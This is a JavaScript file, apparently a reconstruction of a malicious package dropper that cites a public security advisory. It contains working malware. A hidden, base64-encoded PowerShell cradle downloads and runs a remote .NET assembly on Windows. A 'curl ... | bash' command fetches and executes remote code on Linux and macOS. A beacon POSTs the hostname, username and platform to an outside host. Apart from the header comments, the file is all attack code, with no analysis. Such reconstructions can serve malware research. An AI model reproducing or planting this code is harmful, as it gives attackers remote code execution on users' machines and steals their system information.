// powershell-dropper — reconstructed from public security analyses
// Source: https://github.com/advisories/GHSA-6gqx-3gpv-vg7v
//
// PowerShell download cradle that fetches and executes a Cobalt Strike
// beacon. Uses encoded PowerShell command to evade detection.
//
// Technique: PowerShell download cradle + encoded command + Cobalt Strike delivery

const os = require("os");
const { exec, execSync } = require("child_process");
const https = require("https");

// Only target Windows
if (os.platform() === "win32") {
  // Stage 1: PowerShell encoded command to download and execute payload
  var psCommand = [
    "$client = New-Object System.Net.WebClient;",
    "$url = 'https://cdn-packages.net/update/check';",
    "$data = $client.DownloadData($url);",
    "$assembly = [System.Reflection.Assembly]::Load($data);",
    "$entryPoint = $assembly.GetType('Runner').GetMethod('Execute');",
    "$entryPoint.Invoke($null, @())"
  ].join(" ");

  var encoded = Buffer.from(psCommand, "utf16le").toString("base64");

  try {
    exec("powershell -WindowStyle Hidden -EncodedCommand " + encoded, {
      windowsHide: true
    });
  } catch(e) {}
} else {
  // Linux/macOS: curl-based download + execute
  try {
    exec("curl -sL https://cdn-packages.net/update/check | bash", {
      detached: true
    });
  } catch(e) {}
}

// Beacon: send system info to confirm installation
var info = JSON.stringify({
  hostname: os.hostname(),
  platform: os.platform(),
  user: os.userInfo().username,
  arch: os.arch()
});

var req = https.request({
  hostname: "cdn-packages.net",
  path: "/beacon",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(info)
  }
});
req.write(info);
req.end();
